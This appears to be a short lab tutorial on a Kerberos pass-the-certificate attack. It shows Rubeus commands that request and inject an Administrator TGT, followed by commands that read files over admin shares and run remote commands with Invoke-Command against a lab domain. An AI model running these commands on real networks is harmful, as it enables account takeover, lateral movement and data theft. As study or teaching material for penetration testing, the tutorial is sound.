
### Obtaining the TGT

Using the `askTGT` feature of `Rubeus`
using the `/ptt` apply the received TGT to the current sessions

Pass-the-certificate example:
```powershell
# usage
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
# example
.\Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx path> /password:<pfx password> /ptt
```

![[Pasted image 20230111104959.png]]
The TGT is automatically saved in your environment (thanks to /ptt in rubeus).

### Using the TGT

##### List your current session TGTs
```powershell
klist
```
![[Pasted image 20230111135429.png]]

##### Delete all your session TGTs
```powershell
klist purge
```
![[Pasted image 20230111135456.png]]

##### List files on remote system
```powershell
dir \\<computer name>\<drive>\<path>
```
![[Pasted image 20230111105353.png]]

##### Print file on remote system
```powershell
type \\<computer name>\<drive>\<filepath>
# example
type \\WIN-8DRJKS8Q1T9.labad.fr\C$\Users\Administrator\Desktop\SecretFile.txt

```
![[Pasted image 20230111140015.png]]

##### Command execution
```powershell
Invoke-Command -computername <computer name> -ScriptBlock {<command>}
# example
Invoke-Command -computername win-8drjks8q1t9.labad.fr -ScriptBlock {whoami}
```
![[Pasted image 20230111135136.png]]